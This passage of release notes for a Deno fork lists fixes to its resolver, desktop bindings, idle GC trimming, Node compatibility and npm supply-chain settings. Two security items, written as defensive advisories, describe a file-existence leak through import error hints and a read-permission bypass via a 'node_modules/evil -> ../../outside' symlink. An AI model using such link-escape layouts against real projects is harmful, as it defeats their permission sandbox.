     holds only the `cargo package` output, so Cargo never clones V8's
     submodules. The prebuilt library and bindgen output come from release
     `v152.2.1-denext.1` (rusty_v8's `release-denext.yml`, dispatch only: built
     from source on GitHub-hosted runners for the six release targets,
     rusty_v8's tests run, `SHA256SUMS` and build-provenance attestations).
     `fetch_rusty_v8.py`, run by `denext_runtime.yml`'s `denort` and `cli` jobs
     and by the test setup action before any cargo build, downloads both files
     for the target, checks each against `rusty_v8.sha256`, and exports
     `RUSTY_V8_ARCHIVE`, `RUSTY_V8_ARCHIVE_SHA256` (the build script checks the
     archive again) and `RUSTY_V8_SRC_BINDING_PATH`. It fails closed: an
     unlisted target, a failed download, a changed file, a manifest tag that
     does not match Cargo.lock's `v8` version, or a `RUSTY_V8_MIRROR` in the
     environment stops the job, and nothing is ever taken from denoland's
     releases (their 152.2.1+denext.1 does not exist, so the build script's own
     default fails too). Locally, `fetch_rusty_v8.py --from <dir> --print-env`
     verifies files already on disk the same way. The CI steps also pass
     `--seed-dir target/<profile>`, which unpacks the verified library to
     `gn_out/obj/`, where the build script puts it: Swatinem/rust-cache keeps
     the `v8` build-script fingerprint but drops `gn_out`, so a warm cache with
     the same `v8` skipped the script and failed to link ("could not find native
     static library `rusty_v8`", every `cli` job of 3.0.0-denext.3's second
     runtime run).

     Verified on biscuits (Linux x86_64): rusty_v8 from source with
     `V8_FROM_SOURCE=1` in 34 min (`librusty_v8.a` 198 MB), its own
     `cargo test --release` 369 passed, 0 failed, and `v8::V8::get_version()` is
     `15.2.124.45-rusty`; this fork's dev build against that library, verified
     through `fetch_rusty_v8.py --from`, reports `v8 15.2.124.45-rusty` in
     `deno --version` and `Deno.version.v8`, runs `deno eval` with WebAssembly,
     and passes `cargo test --lib -p deno_core` (495 passed),
     `-p serde_v8 -p deno_v8`, and the `version`, `wasm`, `structured_clone` and
     `text_encoding` unit tests (38 of 39; the 39th fetches from the test
     server, which was not running). Tests: `fetch_rusty_v8_test.py` (the
     manifest format, the tag check, hash mismatches, unlisted targets, a mirror
     in the environment, local files, and that the checked-in manifest pins all
     twelve files for Cargo.lock's release), run by `denext_tests.yml`'s lint
     job.

163. **`fix(resolver)`: sloppy-import hints only for prepared modules
     (denoland/deno#36221)** (`fix/audit-lows-denext3`, CLI only;
     `cli/graph_util.rs`, `cli/module_loader.rs`, `cli/graph_container.rs`,
     `cli/tools/check.rs`, `cli/tools/pm/cache_deps.rs`,
     `libs/resolver/graph.rs`, and the callers that pass the new option). The
     fork production audit's U6, carried from upstream `b23cb76e6d` (on
     denoland/deno `main` since 2026-07-22; no v2.9.x release has it). A module
     that failed to load got a "maybe add `.ts` / use `--sloppy-imports`" hint
     from a file-system lookup of its neighbours, and a runtime-computed
     `import(specifier)` did that lookup for a path the static graph never
     prepared, without a read permission check: the error told a program with no
     `--allow-read` whether `<path>.ts`, `<path>.js` or `<path>/index.ts`
     exists. The lookup now runs only for graph roots and the dependencies and
     literal dynamic imports the graph prepared; a computed dynamic-import or
     worker root that no module references gets the plain "Module not found".
     Conflicts: the fork's `prepare_load` keeps its Vitest-adjusted
     `is_dynamic_import` (item 23: the Vitest runner's own imports load as
     static ones), and `cli/tools/check.rs` keeps the fork's imports beside
     `GraphRootsValidOptions`. Tests: upstream's
     `run/sloppy_import_hints_runtime` spec (six cases; `computed_no_read` is
     the no-permission case); before this change `computed_no_read` and
     `computed_requested_read` fail on this branch's base with
     `Unexpected sloppy import suggestion`, and `run/sloppy_imports`, `compile`,
     `bundle`, `check`, `lint`, `publish` and `npm` sloppy-import specs still
     pass.

164. **`fix(desktop)`: bind calls whose page is gone are rejected and dropped**
     (`fix/audit-lows-denext3`, runtime; `runtime/ops/desktop.rs`,
     `cli/rt_desktop/lib.rs`). The fork production audit's R4: every page→app
     bind call (`BrowserWindow.bind`) registers a oneshot sender in
     `PendingBindResponses`, which only the app's answer
     (`op_desktop_resolve_bind_call` / `op_desktop_reject_bind_call`) or a full
     event queue removed. A handler that never settled, or a page that navigated
     away while its handler awaited, kept the entry, the waiting future and
     laufey's `JsCall` forever, so a long-running app with a polling binding
     whose handler sometimes hangs grew without bound. Now:
     - **Pruned on insert:** `register_bind_call` first drops calls whose
       receiver is closed (nobody can take the answer any more).
     - **Page loads:** the window's `on_page_load` calls
       `PendingBindResponses::page_loaded`, which counts the window's completed
       loads; each call records the count it arrived under. laufey reports no
       navigation start and no per-call document, and a page can call a binding
       before its own load completes, so a call that arrived after load `n` may
       be from the page load `n + 1` shows. Once load `n + 1` completes, calls
       that arrived before load `n` did are from documents the window no longer
       shows: they are rejected with "the page that called this binding has
       navigated away or closed" (which answers laufey's `JsCall` and ends the
       waiting future) and dropped. A hung call from a page that navigated away
       is so released on the second load after it; calls from a page still shown
       are never rejected.
     - **Destroyed windows:** `CloseBook::close` rejects a destroyed window's
       calls the same way (`window_gone`); a window kept hidden for a WebGPU
       surface keeps them.
     - `PendingBindResponses`' map is private now (`take`, `len`), and
       `register_bind_call` takes the window id. An optional per-bind timeout
       was not added: it needs a new option on
       `BrowserWindow.bind(name, fn, { origins })` (JS API, DESKTOP_JS, types)
       and the app can already race its own handler against a timer. Tests
       (`runtime/ops/desktop.rs`):
       `bind_call_register_drops_calls_nobody_waits_for` (fails on the base: 2
       entries, not 1), `bind_calls_of_a_page_that_navigated_away_are_rejected`,
       `bind_calls_of_a_destroyed_window_are_rejected`; and
       `bind_call_ids_are_unique_across_concurrent_registers` keeps its
       receivers.

165. **`fix(runtime)`: idle trim keeps a wake-up that arrives during a trim, and
     skips the GC on a large live heap** (`fix/audit-lows-denext3`, runtime;
     `runtime/idle_trim.rs`, `runtime/worker.rs`). The fork production audit's
     R3, two edge behaviours of item 104:
     - **A wake-up during the trim** (a blocking op completing, a worker's
       message, from another thread during the 100-220 ms GC) was discarded by
       the `woken.store(false)` after the trim, which was there for the GC's own
       follow-up wake-ups (V8 posting tasks, finalizers); the task was still
       polled but the scheduler stayed disarmed until the next wake-up. One flag
       can't tell the two apart, so a compare-and-swap on it would either drop
       both (as before) or keep both; they differ by thread: the trim runs on
       the event loop's thread, and anything that wakes the loop from that
       thread during the trim is the trim's own work. The trim now sets a
       thread-local flag, `ActivityWake` doesn't record a wake-up made on that
       thread while it is set, and the post-trim store is gone, so a wake-up
       from any other thread re-arms the scheduler. (A V8 helper thread that
       posts a task during the GC counts as activity; the growth gate then skips
       that idle period's check.)
     - **Large heaps:** the full GC's cost grows with the live heap (on
       biscuits, 140-150 ms for a ~190 MB heap of small objects in this spec),
       and a server holding a large heap on purpose (an in-memory cache) that
       grows 16 MB between sparse requests paid it in front of a request every
       `min_interval`. Raising `DENO_IDLE_TRIM_MIN_GROWTH_MB` / `DELAY_MS` only
       spaces those GCs out, so the trim now skips the GC instead: once a trim's
       GC leaves the V8 heap at `DENO_IDLE_TRIM_MAX_GC_HEAP_MB` or more (default
       1024; `0` never skips), later trims run only `malloc_trim(0)` while the
       heap's used size is still over the limit. The size the last GC left is
       live data, not a burst's garbage, so a burst on a small heap is still
       collected; once V8's own GCs bring the heap under the limit the next trim
       runs the GC again. The first trim always runs it. `DENO_IDLE_TRIM_TRACE`
       prints `gc skipped (heap N MB)` for such a trim. Tests
       (`runtime/idle_trim.rs`):
       `a_wake_from_another_thread_during_a_trim_is_activity` (fails on the
       base: one trim, not two), `a_wake_from_the_trim_itself_is_not_activity`,
       `a_large_heap_skips_the_gc_after_the_first`,
       `the_gc_is_never_skipped_without_a_limit`,
       `trim_now_skips_the_gc_while_the_live_heap_is_over_the_limit` (glibc
       Linux, a real isolate), `config_reads_the_environment`; spec
       `run/idle_trim` `large_heap_skips_gc` (fails on the base: the second trim
       runs a 140 ms GC).

166. **`fix(ext/node)`: better-sqlite3 under Jest's module registry**
     (`feat/nest-g6-g8-denext3`; `ext/node/polyfills/01_require.js`,
     `ext/node/polyfills/internal/better_sqlite3.js`,
     `libs/npm_installer/local.rs`, `libs/npm_installer/hoisted.rs`). Item 61
     serves better-sqlite3's entry modules from the host's CommonJS loader, but
     Jest's module registry reads and evaluates the package's `lib/database.js`
     itself, so under real Jest an app on better-sqlite3 (TypeORM
     `type: 'better-sqlite3'`, Drizzle, Knex) failed with
     `Could not locate the bindings file` while `deno run` / `deno test` worked
     (the Nest phase 0 report's G6). `database.js` loads its addon with
     `require('bindings')('better_sqlite3.node')`; `bindings` finds the file on
     disk through Jest's resolver, and Jest hands a `.node` file to the host's
     `require`. Two parts:
     - the host's `.node` loader (and so `process.dlopen`) answers a file named
       `better_sqlite3.node` whose nearest package.json, at most five
       directories up, is named `better-sqlite3` with the implementation in the
       addon's own shape (`createAddon()`): `setErrorConstructor()`, then
       `new addon.Database(filename, filenameGiven, anonymous, readonly,
       fileMustExist, timeout, verbose, buffer)`
       with the methods the package's JavaScript calls on `this[cppdb]`
       (`prepare(sql, db,
       pragmaMode)`, `function` / `aggregate` with
       their positional options, `backup` as a `transfer()` / `close()` object
       the package polls, `serialize(attached)`, ...). A statement's `database`
       is the package's own Database object, a pragma-mode statement reads as
       the native one does (`reader` true, `[]` for a pragma that sets), and
       SQLite errors are the package's own `SqliteError` class (the one its
       JavaScript gave `setErrorConstructor()`), so `instanceof` holds inside
       the registry. The host's require cache keeps one addon per process while
       Jest evaluates the package once per test file, so the addon's
       `isInitialized` always reads false: each `new Database()` passes its own
       registry's class, which that database keeps (the native addon keeps the
       first test file's, and a later file's `toThrow(SqliteError)` fails when
       the files share a worker);
     - `deno install` writes a placeholder `build/Release/better_sqlite3.node`
       into a fresh better-sqlite3 copy in `node_modules` (isolated and hoisted
       layouts) for `bindings` to find, since the package's install script,
       which builds the real file, doesn't run (item 61). Not over a file that
       is already there (a hard link into the npm cache is never written
       through), and not with `DENO_NO_BETTER_SQLITE3_COMPAT` set; an install
       script that does run replaces it. A package an earlier install already
       put in `node_modules` gets it on its next fresh copy (remove
       `node_modules/better-sqlite3`, or `--reload`).
       `DENO_NO_BETTER_SQLITE3_COMPAT=1` loads the file as an addon, as before.
       Within Jest the implementation's objects (rows, `TypeError`s) come from
       the host realm, not the test's vm context, as Node's own built-ins' do
       there: `toEqual` matches a row, `toStrictEqual` against a literal does
       not (Jest's cross-realm constructor check). Tests: spec
       `node/better_sqlite3_jest_registry` (a registry like jest-runtime's
       evaluating the real better-sqlite3 12.11.1 `lib/` and `bindings` 1.5.0 in
       a vm context: pragmas, a nested transaction, user function and aggregate,
       the package's `SqliteError`, `iterate`, `serialize`, `backup`; and the
       opt-out); unit test `better_sqlite3_placeholder`
       (`libs/npm_installer/local.rs`). Without the fix the spec fails with
       `invalid ELF header` on the placeholder, and with no placeholder with
       `Could not locate the bindings file`, as real Jest 30.2.0 did on
       `3.0.0-denext.2`.

167. **`fix(ext/node)`: a shell-spawned `node` shim on an npm script gets the
     npm resolution** (`feat/nest-g6-g8-denext3`;
     `ext/node/polyfills/internal/child_process.ts`).
     `deno run -A npm:@nestjs/cli new <app>` failed with
     `Cannot find module 'symbol-observable'` (the Nest phase 0 report's G7):
     the CLI runs
     `spawn('node "<cache>/@angular-devkit/schematics-cli/bin/schematics.js" ...', { shell: true })`,
     the `node` Deno puts on `PATH` (no real Node.js installed) ran the script
     from the global npm cache, and without the parent's npm resolution the
     package's own dependencies didn't resolve. A child spawned on
     `Deno.execPath()` already gets that state (upstream's
     `spawn_keeps_npm_state`); a shell command didn't. When this process put the
     `node` shim on `PATH` (`DENO_NODE_SHIM_ACTIVE`) and a `/bin/sh -c` or
     `cmd.exe /d /s /c` command starts with `node` (or `node.exe` on Windows) on
     a script inside an npm package, the child now gets the state file too. With
     a real `node` on `PATH` nothing changes. Test: spec
     `node/shell_node_keeps_npm_state` (unix, `PATH` empty: a package in the
     global cache runs `node "<its script>"` through a shell and the script
     imports its dependency), new test package
     `@denotest/shell-node-keeps-npm-state`.

168. **`fix(task)`: a package.json script doesn't get npm's `--`**
     (`feat/nest-g6-g8-denext3`, CLI only; `cli/tools/task.rs`).
     `deno task test:e2e -- --forceExit` ran `jest -- --forceExit`, so Jest took
     `--forceExit` for a test path pattern (the Nest phase 0 report's G8);
     `npm run x -- args` passes `args` only ("Use `--` to pass `-`-prefixed
     flags and options which would otherwise be parsed by npm",
     docs.npmjs.com/cli/commands/npm-run-script). A package.json script now gets
     its arguments without a leading `--` (`-- a -- b` gives `a -- b`). Only a
     leading one: the npm shim (`cli/npm_shim.rs`) already drops npm's own `--`
     and forwards `npm run x -- a -- b` as `deno task x a -- b`, which must keep
     its `--`. A deno.json task is unchanged: it gets every argument, `--`
     included (upstream's behaviour, unchanged on its `main`). Spec:
     `task/package_json_double_dash` (`args: -- --forceExit a` before).

169. **`fix(ext/node,cli)`: a `node:test` parent waits for the subtests it
     didn't await, and gives them up when only unref'd work is left**
     (`fix/node-compat3-denext3`, runtime and CLI;
     `ext/node/polyfills/testing.ts`, `cli/tools/test/mod.rs`). An unawaited
     `t.test()` (in a sync body, or a body that returns first) was reported
     `INCOMPLETE` and failed its parent, where Node's parent waits for its
     `subtestsPromise` before it finishes (Node 26.5.1
     `lib/internal/test_runner/test.js`, `Test#run`). Every `t.test()` is now
     tracked and drained after the body, as round 1's routed top-level `test()`
     calls already were. A drain the event loop can't finish (a subtest held
     only by an unref'd timer) would leave the whole Deno test pending, which
     `deno test` reports as "Promise resolution is still pending but the event
     loop has already resolved"; round 2 backed the change out for that. Node
     cancels such tests on `'beforeExit'`
     (`lib/internal/test_runner/
     harness.js`). Now, when a test's promise
     is pending on an idle loop, `invoke_test_function` calls `node:test`'s hook
     (`Deno[Deno.internal].nodeTestOnEventLoopIdle`), which gives up the
     innermost parents' waits (the deepest first). The parent then returns and
     Deno reports the unfinished subtest `INCOMPLETE`, and the test is polled
     again. The loop is bounded (1024 runs per test), and a test without
     `node:test` waits is failed as before. Tests: node_compat
     `parallel/test-runner-test-fullname.js`, `-test-filepath.js` and
     `-mock-timers-date.js` enabled. In the spec `node/node_test_module`, "top
     level"'s awaited-nowhere `+short running` / `++short running` now pass as
     in Node; `+long running` (an unref'd timer) stays `INCOMPLETE`. In the spec
     `node/node_test_run_reporter` (`unawaited_subtest`), the parent waits for a
     child on a 10 ms timer.

170. **`feat(ext/node)`: outside `deno test`, `node:test` runs the tests and
     reports them with Node's `spec`, `tap` or `dot` reporter**
     (`fix/node-compat3-denext3`, runtime; `ext/node/polyfills/testing.ts`,
     `libs/node_shim/lib.rs`). `Deno.test()` does nothing outside `deno test`,
     so `node file.js` (the node shim's `deno run`) or `deno run file.js` on a
     file that calls `test()` / `describe()` ran no test, printed nothing and
     exited 0. Only `--test-reporter=tap` took the polyfill's own runner. The
     runner now takes every run outside `deno test` (found by the absence of
     `op_register_test`, as `Deno.test()` finds it), with `spec` by default as
     in Node (`lib/internal/test_runner/utils.js`, `kDefaultReporter`) and `tap`
     / `dot` by `--test-reporter`. Under `deno test` only `tap` uses it, as
     before. Against Node 26.5.1's reporters and harness:
     - **spec** (`reporter/spec.js`, `reporter/utils.js`): `✔` / `✖` / `﹣`
       lines with real `duration_ms`, `▶ name` before a parent's first subtest,
       `# SKIP` / `# TODO` / `# EXPECTED FAILURE`, the
       `ℹ tests …
       duration_ms` summary and the `✖ failing tests:` list
       (with `test at <relative path>:<line>:<column>` and the error inspected),
       colored only on a terminal or with `FORCE_COLOR`. Its output is buffered
       to the next macrotask, as Node's reporter stream reaches stdout after the
       test code of the same turn (the order Node's fixtures show).
     - **dot** (`reporter/dot.js`): `.` / `X`, wrapped at `stdout.columns` (at
       least 20) and re-read after each wrap, then `Failed tests:`.
     - **tap** (`reporter/tap.js`): real durations; a failure's YAML is Node's
       `jsToYaml`: `location`, `failureType`, `error`, `code`, `name`,
       `expected` / `actual` / `operator` and the stack frames. It used to print
       `ok`/`not ok` with no details.
     - **Runner**: `beforeEach` / `afterEach` of the root, of every enclosing
       suite and of enclosing tests (`t.beforeEach()`), outermost first and
       innermost first (Node's inherited hooks), skipped for skipped / todo
       tests; a suite's `before` / `after`; `t.before()` / `t.after()` on test
       contexts; a hook's error fails the test (`hookFailed`); a parent whose
       subtests failed fails with `N subtest(s) failed` (`subtestsFailed`, left
       out of the failing-tests list as Node does). A suite body's rejection is
       the suite's failure, not an unhandled rejection. Tests registered after a
       top-level `await` run before the summary, which waits for `'beforeExit'`
       as Node's root does. A failed run sets `process.exitCode = 1` instead of
       calling `Deno.exit(1)`; `--test-force-exit` exits once the summary is
       out. The context is a `TestContext` (stack frames read
       `TestContext.<name>` as in Node) with `fullName` through the enclosing
       suites and `filePath`.
     - **Node shim**: `--test-only` and `--test-force-exit` ride along in
       `NODE_OPTIONS`, as `--test-reporter` / `--test-name-pattern` /
       `--test-skip-pattern` already did, so a child started with them sees
       them. Left open: stack traces show Deno's `ext:` frames (Node's snapshots
       fold `node:` frames into `<node-internal-frames>`) and file URLs where
       Node prints paths, so fixtures with a failure's stack still differ;
       coverage, `--test-randomize`, `junit` / `lcov` and custom reporter
       modules aren't implemented; an unhandled rejection inside a test isn't
       charged to it. Tests: node_compat
       `test-runner/test-output-spec-reporter-successful.mjs`,
       `-skip-each-hooks.mjs`, `-suite-skip-hooks.mjs`, `-force-exit.mjs`,
       `-async-test-scheduling.mjs` and `-non-tty-forced-color-output.mjs`
       enabled. The spec `node/node_test_run_reporter` covers `spec`, `tap` and
       `dot` output, hook order and the exit code. The shim unit test
       `test_only_and_force_exit_ride_along_in_node_options`.

171. **`fix(ext/node)`: `t.assert.snapshot()` and `node:test`'s `snapshot` API;
     `assert.CallTracker` leaves `node:assert`'s keys**
     (`fix/node-compat3-denext3`, runtime; `ext/node/polyfills/testing.ts`,
     `testing_esm.ts`, `assert.ts`). `t.assert` had no `snapshot`. It now
     follows Node 26.5.1's `lib/internal/test_runner/snapshot.js`: a test's
     snapshots live in `<test file>.snapshot`, keyed `${t.fullName} ${n}` and
     stored as template literals assigned to `exports`, read through `vm`.
     `--test-update-snapshots` (or `deno test --update-snapshots`) writes the
     file instead. `require("node:test").snapshot` has
     `setDefaultSnapshotSerializers()` and `setResolveSnapshotPath()`. The error
     messages are Node's. Node 25 removed `assert.CallTracker` (DEP0173,
     End-of-Life), and `test-runner-assert.js` checks `t.assert`'s keys against
     `node:assert`'s, so `CallTracker` is now non-enumerable on `node:assert`
     and `assert.strict`. It stays reachable, still deprecated, for code written
     against older Node; the ESM named export stays too. Tests: node_compat
     `parallel/test-runner-assert.js` enabled; the spec
     `node/node_test_snapshot` (stored snapshots in Node's format, keys through
     a suite, the template escaping, a mismatch, the missing-snapshot error,
     serializers and the API's argument checks); unit
     `tests/unit_node/assert_test.ts` ("CallTracker correctly exported" also
     checks the keys).

172. **`feat(ext/node)`: `crypto.randomUUIDv7()`** (`fix/node-compat3-denext3`,
     runtime; `ext/node/polyfills/internal/crypto/random.ts`, `crypto.ts`). Node
     26's version 7 UUID (RFC 9562 section 5.7): a 48-bit big-endian Unix
     timestamp in milliseconds, then random bits, version `7` and variant
     `0b10`, with Node's `options` / `disableEntropyCache` checks
     (`lib/internal/crypto/random.js`, `writeTimestamp`). Every call draws fresh
     random bytes; Node's entropy cache is a speed detail. The v4 code now
     shares Node's `serializeUUID` shape. Tests: node_compat
     `parallel/test-crypto-randomuuidv7.js` enabled; unit
     `tests/unit_node/crypto/crypto_misc_test.ts` ("a version 7 UUID led by the
     time": the format, the timestamp within the call's bounds, argument
     errors).

173. **`fix(ext/node)`: `execFile` / `spawn` with `shell: true` take non-string
     arguments** (`fix/node-compat3-denext3`, runtime;
     `ext/node/polyfills/internal/child_process.ts`). With `shell: true` and an
     argument that wasn't a string
     (`execFile(node, [fixture, 42], { shell:
     true })`),
     `stripShellArgQuotes` threw
     `TypeError: arg.startsWith is not
     a function`. Node joins the
     arguments into the command line, so a number is its string form; each
     argument is now `String()`-ed before it is unquoted and escaped.
     `test-child-process-execfile.js` still fails: Deno escapes `shell: true`
     arguments on purpose (denoland/deno#31999, #36371), so its `"$NODE"`
     argument isn't expanded. Test: unit `tests/unit_node/child_process_test.ts`
     ("execFile shell takes non-string arguments as their string form").

174. **`fix(ext/node)`: `process.env` warns DEP0104 only as Node does**
     (`fix/node-compat3-denext3`, runtime;
     `ext/node/polyfills/_process/process.ts`). Every assignment of a non-string
     value warned (`process.env.FORCE_COLOR = 1` printed a
     `DeprecationWarning`). Node's `EnvSetter` (`src/node_env_var.cc`) warns
     only under `--pending-deprecation`, only for a value that is not a string,
     number or boolean, and only once per process. The flag counts from
     `process.execArgv` or `NODE_OPTIONS`. Tests: node_compat
     `parallel/test-process-env-deprecation.js` (enabled, still passing) and
     `test-runner/test-output-non-tty-forced-color-output.mjs`, newly enabled;
     unit `tests/unit_node/process_test.ts` ("process.env takes a number or
     boolean without DEP0104").

175. **`test(node_compat)`: 11 tests the node_compat round 3 fixes pass**
     (`fix/node-compat3-denext3`, test config only;
     `tests/node_compat/config.jsonc`). Each passed three isolated runs (runner
     parallelism 1, report mode, the CI 10 s timeout) on a Linux x86_64 debug
     build. Upstream Deno's per-OS report fails each of them (they pass through
     items 169-174), so each is on for Linux only, with that reason, until
     checked on macOS and Windows: `parallel/test-crypto-randomuuidv7.js`,
     `-runner-assert.js`, `-runner-mock-timers-date.js`,
     `-runner-test-filepath.js`, `-runner-test-fullname.js`,
     `test-runner/test-output-async-test-scheduling.mjs`, `-force-exit.mjs`,
     `-non-tty-forced-color-output.mjs`, `-skip-each-hooks.mjs`,
     `-spec-reporter-successful.mjs`, `-suite-skip-hooks.mjs`.

176. **`fix(npm, ext/node)`: `require()` in a bring-your-own-`node_modules`
     project reads only what the read grant allows through a link** (security,
     `fix/cjs-require-read-denext4`, runtime;
     `cli/lib/npm/permission_checker.rs`, `ext/node/ops/require.rs`,
     `ext/node/lib.rs`, `cli/module_loader.rs`). Fixes a regression from item 67
     (commit 623990ef4c, first released in `v2.9.7-denext.22`). In BYONM mode (a
     package.json-only project, `nodeModulesDir: "manual"`) upstream exempts any
     path with a `node_modules` component from the read check, by spelling
     alone. Item 67 made `op_require_real_path` record the real path of every
     path it was allowed to read, so a link in `node_modules` that leads out of
     it (`node_modules/evil -> ../../outside`) made the files it reaches
     readable to `require()`, `createRequire`, `require.resolve` and an absolute
     `require()` with no `--allow-read` and past `--deny-read`; stock Deno
     refuses them, as do `import()` and `fs`. Two changes: the BYONM exemption
     now canonicalizes the path (following dangling links) and holds only while
     the real path is still inside a `node_modules` directory (a pnpm `.pnpm`
     link is), checking anything else as an ordinary read; and
     `op_require_real_path` records a real path only when its spelling is
     granted by the read permission itself or is a module the loader loaded (the
     new `NodeRequireLoader::is_loaded_module_path`), and the real path is not
     denied or ignored. Otherwise the real path is checked on its own and its
     permission error names it, as an ES module import's does. Item 67's
     symlinked and 8.3 main modules still load: they are in the module graph.
     The exemption is not limited to the project's own `node_modules`
     directories, as BYONM resolves through every ancestor's `node_modules`, as
     Node does. Behaviour change: a BYONM workspace whose `node_modules` links
     to a member outside any `node_modules` directory
     (`node_modules/@scope/pkg -> ../../packages/pkg`, as npm, Yarn and Bun
     workspaces lay out) now needs read access to that member when read is not
     fully granted: for `require()` again (as on stock Deno, before item 67
     lifted it), and now also for the CommonJS export analysis of an `import` of
     it, which reads through the same checker; an ES module `import()` of it
     already needed it. Upstream's related fixes: denoland/deno#35882
     (GHSA-968w-xfqw-vp9q, CVE-2026-49406, the `..` normalization) and #36479
     (registry links in managed mode). Spec: `npm/byonm_require_link_escape`
     (relative, absolute, `createRequire`, `require.resolve`, a chain of links,
     `--deny-read`, a main module through a link with `--deny-read` on its
     target, and a pnpm-style link that still loads);
     `node/cjs_main_symlinked_dir` and
     `npm/require_missing_paths_across_symlinks` still pass.

The runtime-side parts (1-3, 5-22, 24, 25, 27, 32-37, 41-45, 50, 52, 60-62,
64-73, 75-77, 80, 82, 87-89, 91, 93, 95, 97, 99-102, 104, 105, 109, 110, 113,
118, 119, 126, 127, 129, 136, 137, 144-148, 150, 153, 158-160, 162, 164-167,
169-174, 176) are what the prebuilt `libdenort` carries. The CLI-side parts (for
example writing `LAUFEY_CUSTOM_SCHEMES` / `LAUFEY_APP_ID` into a packaged app's
launchers) are in the branch too, but a stock CLI does not run them; denext's
own launcher provides that environment.

The laufey backend hosts are built from
[Brainwires/laufey](https://github.com/Brainwires/laufey) branch
`development-denext` (formerly `denext/integration`; registered schemes, app
data dir, WebKitGTK scheme request bodies, launch config, open-url / single
instance, passkeys, the window API with littledivy/laufey#80 and #81, drag and
drop / file dialogs / rich clipboard, global shortcuts / launch at login /
DevTools control, menu accelerators / notifications, UI-thread tasks / auth
sessions / non-blocking WebKitGTK scheme bodies, Windows bindgen fix, and API
43: auth session cancel, Local Network Access for the registered custom-scheme
origins on CEF, Windows menu and file-dialog fixes, CEF file drops; then the
3.1.0 audits: scheme request cancellation (`on_cancel` on every backend), no
aborts on a NUL in a string, the Linux window-destroy use-after-free, sync UI
hops that can't hang exit; and API 44, the 3.1.1 audit: each JS call's document
origin, the launch file's `bridgeOrigins`, scheme response write backpressure, a
packaged app loading only its own runtime and pinned launch keys, WebKitGTK
sub-frames kept off the bridge, a strict bridge JSON parser; and every host runs
the runtime's own helper and worker launches (`run …`, `NODE_CHANNEL_FD`,
`NEXT_PRIVATE_WORKER`) headless before its single-instance check; and API 48,
the navigation guard; then, for runtime 3.0.0-rc.1, the CEF custom-scheme
localStorage commit gate, KWin's blur, the XCB clipboard and Linux passkeys
through libwebauthn (item 88); and, for runtime 3.0.0-denext.2, legacy Linux
secure-store items read over an encrypted Secret Service session (laufey
879ee0e) and tokio 1.53.3 with laufey's own `.cargo/audit.toml`), at the commit
pinned by `LAUFEY_SHA` in the workflow (or the `laufey_ref` input). The same
commit is the `laufey` git dependency of `cli/rt_desktop/Cargo.toml` (crate
0.8.0, API 49, CEF 150.0.21).

laufey's `init_api` rejects any C ABI version mismatch between the runtime and
the host, so the `laufey` crate libdenort links and the hosts are built from the
**same** laufey revision: the workflow patches whatever source `Cargo.lock`
names for `laufey` (crates.io, or a git rev of Brainwires/laufey) with a path to
that revision's `capi/`, records the `LAUFEY_API_VERSION` it compiled, and the
package job fails if it differs from the hosts' `capi/include/laufey.h`.

## npm supply-chain settings

Items 83-86. Each `.npmrc` key also reads `npm_config_<key>` /
`NPM_CONFIG_<KEY>` from the environment (`-` as `_`), and deno.json's
`supplyChain` (the root deno.json only) mirrors them. Where several sources (the
`.npmrc` files, the environment, deno.json) set a key, the stricter value wins;
under `paranoid`, a weaker one is an error.

| `.npmrc` key                 | deno.json `supplyChain`                                            | Flag                                   | Default | What                                                                                                                                    |
| ---------------------------- | ------------------------------------------------------------------ | -------------------------------------- | ------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| `paranoid`                   | `paranoid`                                                         |                                        | `false` | Every gate on and failing closed (item 86).                                                                                             |
| `jail-scripts`               | `jailScripts`: `true` / `false`, or `{ net, packages }`            | `--jail-scripts` / `--no-jail-scripts` | `true`  | Approved dependencies' lifecycle scripts run confined (item 83; on by default, item 103). `false` opts out, not under `paranoid`.       |
|                              | `jailScripts.net`                                                  |                                        | `false` | Network for every jailed script.                                                                                                        |
|                              | `jailScripts.packages.<name>`: `{ env, write, net, executables }`  |                                        |         | A package's exceptions: environment variables passed through, extra writable directories (relative to deno.json), network.              |
|                              | `jailScripts.knownPackages.<name>`: `[host, ...]`                  |                                        |         | The download hosts the package may declare for itself (`binary.host`); an undeclared or unlisted one reaches nothing (item 124).        |
| `advisory-check`             | `advisoryCheck`: `"on"` / `"off"` / `"required"`                   |                                        | `on`    | Refuse versions OSV lists as malicious; `required` also refuses when OSV can't be reached (item 84).                                    |
| `low-download-check`         | `lowDownloadCheck`: `"off"` / `"warn"` / `"prompt"` / `"required"` |                                        | `warn`  | What `deno add` does below the threshold: warn and add; ask in a terminal and refuse without one; also refuse unknown counts (item 85). |
| `low-download-threshold`     | `lowDownloadThreshold`                                             |                                        | `1000`  | Weekly downloads below which the low-download check applies; `0` turns it off (item 85).                                                |
| `allowed-unpopular-packages` | `allowLowDownloads`                                                | `--allow-low-downloads[=<names>]`      |         | Names (or `@scope/*`, `prefix*`) `deno add` adds whatever their counts; the flag without names allows all (not under paranoid).         |
| `trust-policy`               |                                                                    |                                        | `off`   | `paranoid` sets `no-downgrade`.                                                                                                         |

What each gate does by default, and under `paranoid`:

| Gate                       | Default                                          | `paranoid`                                                    |
| -------------------------- | ------------------------------------------------ | ------------------------------------------------------------- |
| Malicious versions (OSV)   | On: refused; OSV unreachable warns and installs  | Refused; OSV unreachable refuses                              |
| Low downloads (`deno add`) | Warns with the count and how to allow it; adds   | Asks in a terminal, refuses without one and on unknown counts |
| Lifecycle scripts          | Jailed (item 103); `jail-scripts=false` opts out | Jailed; not run where the OS can't confine them               |
| Trust policy               | `off`                                            | `no-downgrade`                                                |

The services: `https://api.osv.dev/v1/querybatch` (no account) and
`https://api.npmjs.org/downloads/point/last-week/<name>`, through Deno's HTTP
client (proxy settings and `--cert` apply). `DENO_OSV_URL` and
`DENO_NPM_DOWNLOADS_URL` name others (a mirror; the spec tests' stand-ins);
`DENO_OSV_CACHE_TTL` sets how many seconds a clean OSV result is reused (86400).
Inside a jailed script, `DENO_INTERNAL_LIFECYCLE_JAIL` carries the permissions
every `deno` clamps itself to; it is internal.

## Release archives

One archive per target and backend:
`deno-desktop-runtime-<version>-<target>-<backend>.tar.gz` (`<version>`: the
fork's own, `3.0.0-rc.1`; up to `denext.22` it was `<deno version>-denext.<n>`)
(`.zip` on Windows). Targets: `aarch64-apple-darwin`, `x86_64-apple-darwin`,
`x86_64-unknown-linux-gnu`, `aarch64-unknown-linux-gnu`,
`x86_64-pc-windows-msvc`, `aarch64-pc-windows-msvc` (from `denext.21`).
Backends: `webview`, `cef`.

```text
